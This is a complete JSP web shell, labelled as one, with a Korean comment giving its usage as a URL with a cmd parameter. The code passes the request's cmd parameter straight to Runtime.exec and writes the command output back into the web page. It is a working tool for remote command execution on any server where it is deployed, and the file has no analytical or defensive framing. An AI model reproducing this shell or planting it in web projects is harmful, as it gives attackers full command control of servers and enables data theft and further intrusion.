/* JSP Version URL CMD WebShell           */
/* 사용법 : hxxp://URL/cmd.jsp?cmd=명령어 */
 
<%@ page import="java.io.*" %>
<%
    try {
            String cmd = request.getParameter("cmd");
            Process child = Runtime.getRuntime().exec(cmd);
            InputStream in = child.getInputStream();
            int c;
            
            while ((c = in.read()) != -1) {
                out.print((char)c);
            }
            
            in.close();
            
            try {
                child.waitFor();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
    } catch (IOException e) {
        System.err.println(e);
    }
%>